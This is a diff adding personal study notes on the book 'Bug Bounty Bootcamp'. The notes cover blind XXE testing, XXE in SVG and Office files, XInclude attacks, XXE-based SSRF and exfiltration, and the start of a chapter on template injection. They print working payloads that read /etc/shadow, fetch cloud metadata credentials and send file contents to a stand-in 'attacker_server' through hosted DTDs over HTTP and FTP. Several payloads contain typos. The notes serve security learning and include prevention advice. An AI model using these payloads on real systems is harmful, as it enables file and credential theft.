@@ -3236,4 +3236,397 @@ _Step 3: Test for Blind XXE_
 
 "If the server takes XML input but does not return the XML document in an HTTP response, you can test for a blind XXE instead... Most blind XXE attacks steal data by having the target server make a request to the attacker's server with the exfiltrated information."
 
+- Make sure the server can make outbound requests to your server.
+- Try making an external entity load a resource on your machine.
+  - To bypass common firewall restrictions, test will port 80 and 443 first.
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
+  ]>
+  <example>&test;</example>
+  ```
+  - Search the logs of your server and look for a request to the particular file.
+  - In this example you'll be looking for a GET request for the `xxe_test.txt` file.
+
+_Step 4: Embed XXE Payloads in Different File Types_
+
+"Besides testing for XXEs on HTTP request bodies, you can try to upload files containing XXE payloads to the server. File-upload endpoints and file parsers are often not protected by the same XXE protection mechanisms as regular endpoints... Hiding your XXE payloads in different file types means that you will be able to upload your payloads even if the application restricts the type of files that can be uploaded."
+
+- To embed an XXE payload in an SVG image, open the image as a text file.
+
+  - ex. An SVG file of a blue circle:
+
+  ```
+  <svg width="500" height="500">
+    <circle cs="50" cy="50" r="40" fill="blue" />
+  </svg>
+  ```
+
+  - Insert the XXE payload by adding a DTD directly into the file and referencing the external entity in the SVG image:
+
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY test SYSTEM "file:///etc/shadow">
+  ]>
+  <svg width="500" height="500">
+    <circle cx="50" cy="50" r="40" fill="blue" />
+    <text font-size="16" x="0" y="16">&test;</text>
+  </svg>
+  ```
+
+- Microsoft Word (_.docx_), Powerpoint (_.pptx_), and Excel (_.xlsx_), are archive files containing XML files.
+  - You can insert XXE payloads into them as well.
+  - To do this, you need to unzip or unarchive the file then insert your payload into `/word/document.xml`, `/ppt/presentation.xml`, or `/xl/workbook.xml`
+    - When you unarchive a DOCX file, you will see a few folders containing XML files.
+    - To repack the file, cd into the directory containing the files are run `rip -r filename.format *`
+
+_Step 5: Test for XInclude Attacks_
+
+"Sometimes you cannot control the entire XML document or edit the DTD of an XML document. But you can still exploit an XXE vulnerability if the target application takes your user input and inserts it into XML documents on the backend. In this situation, you might be able to execute an XInclude attack instead. _XInclude_ is a special XML feature that builds a separate XML document from a single XML tag named _xi:include_."
+
+- If you can control a single piece of unsanitized data passed into an XML documnt, you might be able to place an XInclude attack within the value.
+  - To test, insert the following payload into the data entry point and see if the file you requests get sent back in the response body:
+  ```
+  <example xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/hostname"/>
+  </example>
+  ```
+  - This references the `http://www.w3.org/2001/XInclude` namespace so that we can use the `xi:include` element.
+    - It then uses that element to parse and include the `/etc/hostname` file in the XML document.
+
+**Escalating the Attack**
+
+- What you can achieve depends on the permissions given to the XMl parser.
+- XXEs can be used to access and exfiltrate system files, source code, and directory listings on the local machine.
+- XXEs can be used to perform SSRF attacks to port-scan the target's internal network, read files on the network, and access resources that are hidden behind a firewall.
+- XXEs could be used for DoS attacks.
+
+_Reading Files_
+
+- To read local files, place the local file's path into the DTD of the parsed XML file.
+  - Local files can be accessed using the `file://` URL scheme followed by the file's path on the machine.
+  - ex.
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY file SYSTEM "file:///etc/shadow">
+  ]>
+  <example>&file;</example>
+  ```
+
+_Launching an SSRF_
+
+- You can launch a port scan by switching out the external entity's URL with different ports on the target machine. This is similar to the port-scanning technique mentioned in Chapter 13.
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY file SYSTEM "http://10.0.0.1:80">
+  ]>
+  <example>&file;</example?>
+  ```
+- You can also use XXEs to launch and SSRF to pull instance metadata:
+  ```
+  <?xml version"1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  ]>
+  <example>&file;</example>
+  ```
+  - When trying to view unintended data like this, you should look for the exifltrated data by inspecting the page source code or HTTP response directly, rather than viewing the HTML page rendered by the browser, because the browser might not render the page correctly.
+  - You can use the information gathered from network scanning and retrieving instance metadata to pivot into internal services.
+
+_Using Blind XXEs_
+
+- If the app doesn't return the XML parsing to the user, you may be able to exfiltrate the data to a server that you control by forcing the XML parser to make an external request with the desired data in the request URL.
+
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE example [
+    <!ENTITY file SYSTEM "file://etc/shadow">
+    <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
+  ]>
+  <example>&exiltrate;</example>
+  ```
+
+  - The above probably won't work because most parsers do not allow external entities to be included in other external entities.
+    - Parsers would stop processing the DTD once they encounter the line `<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">`
+    - Exiltrating data using an XXE is a bit more complicated than a classic XXE (not blind).
+  - To get the Blind XXE to work, you need to utilize _parameter entities_.
+    - Parameter entities are XML entities that can be referenced only elsewhere within the DTD.
+    - They are declared and referenced with a percent (%) character.
+    - Comments in XML have the following syntax: `<!--Your comment-->`
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE example [
+      <!ENTITY % file SYSTEM "file:///etc/shadow"> <!--Declares a parameter called "file" that contains "/etc/shadow"-->
+      <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>"> <!--Declares a parameter entity named "ent" that contains a dynamic declaration of another parameter entity called "exfiltrate"-->
+      %ent;
+      %exiltrate;
+    ]>
+    ```
+    - `&#x25` is the hex-encoded version of the percentage sign (%)
+      - Depending on your target, hex encoding is sometimes needed for special characters within dynamic declarations.
+    - The exfiltrated entity points to the attacker's server with the contents of `/etc/shadow` in the URL parameter.
+    - The DTD references `ent` to declare the `exfiltrate` entity and then references `exfiltrate` to trigger the outbound request.
+  - This also may not work because, according to XML specifications, parameter entities are treated differently in inline DTDs (DTDs within the XML doc specified with the `DOCTYPE` tag) and external DTD (A separate DTD hosted elsewhere).
+    - Within DTDs, parameter entities cannot be referenced within markups, so this line won't work: `<!ENTITY &#x25; exilftrate SYSTEM 'http://attacker_server/?file;'>`, but in external DTDs, no such restrictions exist.
+  - To exiltrate data with a blind XXE, you have to overcome this restriction byhosting an external DTD on your server.
+
+    - ex. [xxe.dtd](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/XXEs/xxe.dtd) hosted on server:
+
+    ```
+    <!--Use this by hosting it on your attacker server-->
+    <!--Change the file to whatever file you're hoping to exiltrate-->
+    <!--Change the attacker_server to your server-->
+
+    <!ENTITY % file SYSTEM "file:///etc/shadow">
+    <!ENTITY % ent "<!ENTITY &#x25; exiltrate SYSTEM 'http://attacker_server/?%file;'>">
+    %ent;
+    %exiltrate;
+
+    <!-- Make the target parser interpret your DTD by specifying it within a parameter entity and referencing that entity with a payload like:-->
+    <!-- Payload:
+
+    <?xml version="1.0" encoding="UTF-8"
+    <!DOCType example [
+      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
+      %xxe;
+      ]>
+
+    -->
+    ```
+
+    - The target server will parse the submitted XML file and notice that a parameter entity is referencing an external file.
+    - The target server will retrieve and parse the external DTD, so you payload will execute, and the target will send the exiltrated data back to your server.
+    - Notice we only used parameter entities and did not use external entities at all.
+    - If the parser blocks external entities or limits the referencing of entities to protect against XXE, you can use this technique as well.
+    - This strategy can exiltrate only a signel file of the target file, because the newline charcater (\n) within target files will interrupt the outbound URL and may even cause the HTTP request to fail.
+    - To avoid this, you can force the parser to return a descriptive error message.
+      - ex.
+      ```
+      <!ENTITY % file SYSTEM "file:///etc/shadow">
+      <!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
+      %ent;
+      %error;
+      ```
+    - This works by including the contents of `/etc/shadow` in the URL parameter of the nonexistent filepath.
+    - You then submit the same payload to the target to trigger the attack with the new external DTD:
+
+    ```
+    <?xml version="1.0" encoding="UTF-8"
+    <!DOCType example [
+      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe-error.dtd">
+      %xxe;
+      ]>
+    ```
+
+    - This should result in the parser delivering the desired file contents as a File Not Found error:
+      `java.io.FileNotFoundException: file://nonexistent/File Contents of /etc/shadow`
+
+**Performing Denial-of-Service Attacks**
+
+- I couldn't care less about DoS and DDoS attacks because they're always out of scope.
+  - If I find I really want to dive more into these I may come back and finish this section. As for now, I'm skipping it.
+
+**More About Data Exfiltration Using XXEs**
+
+- XXE data exfiltration becomes more complicated if the parser is hardened against XXE attacks, and if you're trying to read files of specific formats.
+- If you're trying to exfil files that contain XML special characters, such as angle brackets (<>), quotes (' or "), or ampersand (&), accessing these files directly via an XXE would break the syntax of your DTD and interfere with exfil.
+  - XML has a feature that deals with this issue using `CDATA`.
+  - Characters wrapped within CDATA tags are not seen as special characters.
+  - example external DTD using CDATA:
+  ```
+  <!ENTITY % file SYSTEM "file:///passwords.xml">
+  <!ENTITY % start "<!CDATA[">
+  <!ENTITY % end "]]>">
+  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate 'http://attacker_server/?start;%file;%end;'>">
+  %ent;
+  %exfiltrate;
+  ```
+  - This declares two parameter entities containing the strings `"<![CDATA"` and `"]]>"`
+  - It then constructs an exiltration URL that will not break the DTD's syntax by wrapping the file's contents in a `CDATA` tag.
+  - The concatenated `exfiltrate` entity declaration will become: `<!ENTITY % exfiltrate 'http://attacker_server/?<!CDATA[CONTENTS_OF_THE_FILE]]>'>`
+  - With the growing complexity of our payloads, you can use a linter such as XmlLint to check your files for syntax errors.
+    - In my Arch Linux github, I go over setting up nvim with linting to help find errors, highlight syntax, etc.
+  - After hosting the new DTD file, execute the new payload on the target:
+  ```
+      <?xml version="1.0" encoding="UTF-8"
+    <!DOCType example [
+      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe-cdata.dtd">
+      %xxe;
+      ]>
+  ```
+- If the target is PHP-based, you can use PHP wrappers to let you convert the desired data into base64 format so you can use it to read XML files or even binary files:
+  ```
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
+  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
+  %ent;
+  %exfiltrate;
+  ```
+- FTP can also be used to send data directly while bypassing special character restrictions.
+  - HTTP has many special character restrictions and typically restricts the length of the URL. Using FTP instead is an easy way to bypass that.
+  - Run a simple FTP server on your machine and modify your malicious DTD accordingly.
+  ```
+  <!ENTITY % file SYSTEM "file:///etc/shadow">
+  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker_server:2121/?%file;'>">
+  %ent;
+  %exiltrate;
+  ```
+  - The book uses this simple Ruby server [script](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb).
+
+**Finding Your First XXE**
+
+1. Find data entry points that you can use to submit XML data.
+2. Determine whether the entry point is a candidate for a classic or blind XXE. The endpoint might be vulnerable to classic XXE if it returns the parsed XML data in the HTTP response. If the endpoint does not return results, it might still be vulnerable to blind XXE, and you should set up a callback listener for your tests.
+3. Try out a few test payloads to see if the parser is improperly configured. In the case of classic XXEs, you can check whether the parser is processing external entities. In the case of blind XXEs, you can make the server send requests to your callback listener to see if you can trigger outbound interaction.
+4. If the XML parser has the functionalities that make it vulnerable to XXE attacks, try to exfiltrate a common system file, like `/etc/hostname`.
+5. You can also try to retrieve some more sensitive system files, like `/etc/shadow` or `~/.bash_history`.
+6. If you cannot exfiltrate the entire file with a simple XXE payload, try to use an alternative data exfiltration method.
+7. See if you can launch an SSRF attack using the XXE.
+8. Draft your first XXE report!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+## Chapter 16: Template Injection
+
+"_Template engines_ are a type of software used to determine the appearance of a web page. Developers often overlook attacks that target these engines, called _server-side template injections (SSTIs)_, yet they can lead to severe consequences, like remote code execution. They have become more common in the past few years, with instances found in the applications of organizations such as Uber and Shopify."
+
+**Mechanisms**
+
+"To understand how template injections work, you need to understand the mechansisms of the template engines they target. Simply put, templat engines combine application data with web templates to produce web pages. These web templates, written in template languages such as Jinja, provide developers with a way to specify how a page should be rendered. Together, web templates and template engines allow developers to separate server-side application logic and client-side presentation code during web development."
+
+_Template Engines_
+
+- How Jinja and Python work together:
+- ex. [Template file](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/TemplateInjection/example.jinja) written in Jinja:
+  ```
+  <html>
+    <body>
+    <h1>{{ list_title }}</h1>
+    <h2>{{ list_description }}</h2>
+    {% for item in item_list %}
+      {{ item }}
+      {% if not loop.last %}
+    {% endfor %}
+    </body>
+  </html>
+  ```
+  - This template looks like HTML but it contains special syntax to indicate content that the template engine should interpret as template code.
+  - In Jinja, any code surrounded by double curly brackets (`{{}}`) is interpreted as a Python expression and code surrounded by percent sign pairings within curly brackets (`{% %}`) are interpreted as Python statements.
+    - An _expression_ is either a variable or a function that returns a value.
+    - A _statement_ is code that doesn't return anything.
+  - You can see in the above Jinja that we embed the expressions `list_title` and `list_description` in html header tags.
+  - The code then creates a loop to render all items in the `item-list` variable in the HTML body.
+  - The dev can then combine the template with Python code to create the complete HTML page.
+- ex. [Python code](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/TemplateInjection/ExampleCreate.py):
+
+```
+from jinja2 import Template
+
+with open('example.jinja') as f:
+    tmpl = Template(f.read())
+
+print(tmpl.render(
+    list_title="Chapter Contents",
+    list_description="Here are the contents of chapter 16.",
+    item_list=[
+        "Mechanisms Of Template Injection",
+        "Preventing Template Injection",
+        "Hunting For Template Injection",
+        "Escalating Template Injection",
+        "Automating Template Injection",
+        "Find your First Template Injection!"]
+))
+```
+
+- The Python code reads the template file `example.jinja`
+- It generates an HTMl page dynamically by providing the template with the values it needs (line 4).
+- Renders the template with the values `Chapter Contents` as `list_title`.
+- `Here are the contents of chapter 16.` as `list_description`
+- Has a list of values as `item_list`.
+  - You will need to have jinja2 installed to be able to run this python code.
+  - You can do that using a package manager, or by creating an python environment and installed jinja2 with pip.
+- Running this Python script with the `example.jinja` file will produce the following:
+
+```
+<html>
+  <body>
+  <h1>Chapter Contents</h1>
+  <h2>Here are the contents of chapter 16.</h2>
+  Mechanisms Of Template Injection,
+  Preventing Template Injection,
+  Hunting For Template Injection,
+  Escalating Template Injection,
+  Automating Template Injection,
+  Find Your First Template Injection!
+  </body>
+</html>
+```
+
+- Template engines are used to make rendering web pages more efficient by standardizing the format and automating the creation of content.
+- Separating HTML code and application logic also make it easier for developer to modify and maintain parts of the HTML code.
+- Popular template engines:
+  - Works with Python: Jinja, Django, and Mako.
+  - Works with PHP: Smarty, Twig.
+  - Works with Java: Apache FreeMarker, Apache Velocity.
+
+_Injecting Template Code_
+
+"Template injection vulnerabilities happen when a user is able to inject input into templates without proper sanitization. Our previous example isn't vulnerable to template injection vulnerabilities because it does not embed user input into templates. It simply passes a list of hardcoded values as the `list_title`, `list_description`, and `item_list` into the template. Even if the preceding Python snippet does pass user input into the template like this, the code would not be vulnerable to template injection because it is safely passing user input into the template as data:"
+
+```
+from jinja2 import Template
+with open('example.jinja') as f:
+  tmpl = Template(f.read())
+print(tmpl.render(
+  list_title = user_input.title,
+  list_description = user_input.description,
+  item_list = user_input.list,
+))
+```
+
+- Template engines become vulnerable when developers treat templates like strings in programming languages and directly concatenate user input into them.
+  - This is because the template engine won't be able to distinguish between user input and the developer's template code.
+  - ex.
+  ```
+  from jinja2 import Template
+  tmpl = Template("
+  <html><h1>The user's name is:" + user_input + "</h1></html")
+  print(tmpl.render())
+  ```
+  - This code creates a template by concatenating HTML code and user input together, then renders the template.
+  - If the user submits a GET request to display their name:
+  ```
+  GET /display_name?name=Vickie
+  Host: example.com
+  ```
+  - This will generate:
+  ```
+  <html>
+    <h1>The user's name is: Vickie</h1>
+  </html>
+  ```
+  - An attacker could submit a payload like:
+  ```
+  GET /display_name?name={{1+1}}
+  Host: example.com
+  ```
+  - Jinja2 interprets anything within double curly brackets `{{}}` as Python code.
+    - This means that an attacker could run any code they wanted and get the results returned within the HTML page.
+    - If the python code used to render the templates has imported things like `os` or has higher privileges than necessary, you could start getting RCEs.
+
+**Prevention**
+
+- Regularly patch and update frameworks and libraries.
+- Prevent users from supplying user-submitted templates if possible.
+- Use a template engine that provides a hardened sandbox environment that can safely handle user input.
+  - There are still many published sandbox escape exploits, so this isn't enough on its own.
+- Implement an allowlist for allowing attributes in templates to prevent the kind of RCE exploit that is shown later in the chapter.
+- Limit descriptive errors that can help attackers develop exploits. Handle these errors properly and return a generic error page to the user.
+- Sanitize user input before embedding it into web templates and avoid injecting user-supplied data into templates whenever possible.
+
+**Hunting for Template Injection**
+
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
